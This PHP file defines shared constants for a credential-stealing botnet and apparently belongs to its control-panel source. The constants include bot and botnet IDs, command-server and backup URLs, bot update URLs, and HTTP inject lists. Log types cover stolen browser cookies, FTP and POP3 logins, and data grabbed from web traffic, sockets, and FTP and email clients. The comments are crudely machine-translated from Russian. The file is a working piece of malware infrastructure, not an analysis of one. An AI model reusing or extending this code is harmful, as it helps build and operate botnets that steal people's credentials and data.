<?php
/*
  Список макросов общих для C и PHP.
  Файл подключаеся в make.php
  
  Примечание: Т.к. PHP использует только тип int(знаковый), то во всех макросов нужно использовать
              знак минус для высоких значений.
*/

//ID for BinStorage elements.
$_COMMON_DEFINE['SBCID_BOT_ID']                = '10001'; //ID Bot.
$_COMMON_DEFINE['SBCID_BOTNET']                = '10002'; //Botnet.
$_COMMON_DEFINE['SBCID_BOT_VERSION']           = '10003'; //Version.
$_COMMON_DEFINE['SBCID_NET_LATENCY']           = '10005'; //Lag network.
$_COMMON_DEFINE['SBCID_TCPPORT_S1']            = '10006'; //Port for Socks.
$_COMMON_DEFINE['SBCID_PATH_SOURCE']           = '10007'; //Source file path.
$_COMMON_DEFINE['SBCID_PATH_DEST']             = '10008'; //The final path of the file.
$_COMMON_DEFINE['SBCID_TIME_SYSTEM']           = '10009'; //System time.
$_COMMON_DEFINE['SBCID_TIME_TICK']             = '10010'; //GetTickCount.
$_COMMON_DEFINE['SBCID_TIME_LOCALBIAS']        = '10011'; //GMT offset.
$_COMMON_DEFINE['SBCID_OS_INFO']               = '10012'; //Version of the OS DWORD [5] (major, minor, build_number, sp, (wSuiteMask + wProductType)).
$_COMMON_DEFINE['SBCID_LANGUAGE_ID']           = '10013'; //Language ID.
$_COMMON_DEFINE['SBCID_PROCESS_NAME']          = '10014'; //Way process.
$_COMMON_DEFINE['SBCID_PROCESS_USER']          = '10015'; //User name for the process.
$_COMMON_DEFINE['SBCID_IPV4_ADDRESSES']        = '10016'; //List of IPv4.
$_COMMON_DEFINE['SBCID_IPV6_ADDRESSES']        = '10017'; //List of IPv6.
$_COMMON_DEFINE['SBCID_BOTLOG_TYPE']           = '10018'; //Type of log.
$_COMMON_DEFINE['SBCID_BOTLOG']                = '10019'; //Log.

$_COMMON_DEFINE['SBCID_SCRIPT_ID']             = '11000'; //ID of the script. MD5 hash.
$_COMMON_DEFINE['SBCID_SCRIPT_STATUS']         = '11001'; //The status of the script.
$_COMMON_DEFINE['SBCID_SCRIPT_RESULT']         = '11002'; //Tekstvy report on the implementation team. No more than 0xFFFF characters.

$_COMMON_DEFINE['CFGID_LAST_VERSION']          = '20001'; //The latest available version of the bot.
$_COMMON_DEFINE['CFGID_LAST_VERSION_URL']      = '20002'; //URL, where you can download the latest version of the bot.
$_COMMON_DEFINE['CFGID_URL_SERVER_0']          = '20003'; //URL server-side script.
$_COMMON_DEFINE['CFGID_URL_ADV_SERVERS']       = '20004'; //Multi-line backup addresses the server script.
$_COMMON_DEFINE['CFGID_HTTP_FILTER']           = '20005'; //Multi-line filtering HTTP.
$_COMMON_DEFINE['CFGID_HTTP_POSTDATA_FILTER']  = '20006'; //Multi-line for post-filtering of data.
$_COMMON_DEFINE['CFGID_HTTP_INJECTS_LIST']     = '20007'; //List HTTP-inzhektov/feykov.
$_COMMON_DEFINE['CFGID_DNS_LIST']              = '20008'; //List of DNS.

//Values ​​for SBCID_BOTLOG_TYPE.
$_COMMON_DEFINE['BLT_UNKNOWN']                 = '0';   //Neivestny report.

$_COMMON_DEFINE['BLT_COOKIES']                 = '1';   //Cookies browsers.
$_COMMON_DEFINE['BLT_FILE']                    = '2';   //File.

$_COMMON_DEFINE['BLT_HTTP_REQUEST']            = '11';  //HTTP-request.
$_COMMON_DEFINE['BLT_HTTPS_REQUEST']           = '12';  //HTTPS-Request.

$_COMMON_DEFINE['BLT_LOGIN_FTP']               = '100'; //Login FTP.
$_COMMON_DEFINE['BLT_LOGIN_POP3']              = '101'; //Login POP3.

$_COMMON_DEFINE['BLT_GRABBED_UI']              = '200'; //Data obtained from the User Interface.
$_COMMON_DEFINE['BLT_GRABBED_HTTP']            = '201'; //Data obtained from the HTTP (s).
$_COMMON_DEFINE['BLT_GRABBED_WSOCKET']         = '202'; //Data obtained from WinSocket.
$_COMMON_DEFINE['BLT_GRABBED_FTPSOFTWARE']     = '203'; //Data obtained from the FTP-client.
$_COMMON_DEFINE['BLT_GRABBED_EMAILSOFTWARE']   = '204'; //Data obtained from the E-mail-clients.
$_COMMON_DEFINE['BLT_GRABBED_OTHER']           = '299'; //The data obtained from other sources.

//Limits.
$_COMMON_DEFINE['BOT_ID_MAX_CHARS']            = '100'; //The maximum size of the name of the bot
$_COMMON_DEFINE['BOTNET_MAX_CHARS']            = '20';  //The maximum size of the name of a botnet
?>